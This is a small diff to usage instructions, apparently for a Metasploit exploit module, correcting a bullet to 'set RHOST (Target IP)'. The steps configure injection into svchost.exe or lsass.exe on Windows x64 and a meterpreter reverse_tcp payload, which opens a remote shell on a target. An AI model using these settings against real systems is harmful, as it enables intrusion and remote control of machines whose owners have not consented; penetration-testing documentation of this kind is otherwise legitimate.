@@ -22,7 +22,7 @@ Note !!!: Also copy 'deps' directory to /usr/share/metasploit-framework/modules/
 
  * For Windows x64 
 
--  RHOST (Target IP)
+ - set RHOST (Target IP)
  - set PROCESSINJECT svchost.exe or set PROCESSINJECT lsass.exe
  - set TARGETARCHITECTURE x64
  - set payload windows/x64/meterpreter/reverse_tcp
